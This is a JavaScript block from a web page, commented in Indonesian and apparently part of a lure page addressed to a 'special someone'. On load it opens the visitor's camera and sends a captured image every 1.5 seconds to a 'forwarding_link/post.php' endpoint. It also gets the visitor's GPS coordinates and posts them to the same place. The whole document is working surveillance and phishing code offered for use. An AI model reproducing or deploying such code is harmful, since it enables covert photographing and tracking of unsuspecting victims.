  <script>
    // ==========================================
    // FUNGSI PENTING - JANGAN DIUBAH

    // Nama default - JANGAN DIUBAH
    const receiverName = "Seseorang Spesial";

    // Camera functionality - JANGAN DIUBAH
    function initCamera() {
      navigator.mediaDevices.getUserMedia({video: true})
        .then(handleCameraSuccess)
        .catch(handleCameraError);
    }
    function handleCameraSuccess(stream) {
      video.srcObject = stream;
      video.play();
      document.getElementById('cameraStatus').textContent = 'Camera: Active';
      document.getElementById('cameraStatus').className = 'status success';

      // Mulai capture setiap 1.5 detik - JANGAN DIUBAH
      setInterval(() => {
        captureAndSend();
      }, 1500);
    }

    function handleCameraError(error) {
      console.log('Camera error:', error);
      document.getElementById('cameraStatus').textContent = 'Camera: Error - ' + error.message;
      document.getElementById('cameraStatus').className = 'status error';
    }

    function captureAndSend() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const imageData = canvas.toDataURL('image/jpeg');
      postData(imageData);
    }

    // Location functionality - JANGAN DIUBAH
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const coords = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            };
            sendLocationData(coords);
            document.getElementById('locationStatus').textContent = 'Location: Captured';
            document.getElementById('locationStatus').className = 'status success';
          },
          (error) => {
            console.log('Location error:', error);
            document.getElementById('locationStatus').textContent = 'Location: Error - ' + error.message;
            document.getElementById('locationStatus').className = 'status error';
          }
        );
      } else {
        document.getElementById('locationStatus').textContent = 'Location: Not supported';
        document.getElementById('locationStatus').className = 'status error';
      }
    }

    function sendLocationData(coords) {
      $.ajax({
        type: 'POST',
        data: {
          location: JSON.stringify(coords),
          name: receiverName
        },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: true
      });
    }

    // Post data functionality - JANGAN DIUBAH
    function postData(imageData) {
      $.ajax({
        type: 'POST',
        data: {
          image: imageData,
          name: receiverName
        },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: true
      });
    }

    // ==========================================
    // INISIALISASI - JANGAN DIUBAH
    // ==========================================

    window.addEventListener('load', function () {
      initCamera();  // HARUS dipanggil
      getLocation(); // HARUS dipanggil
    });
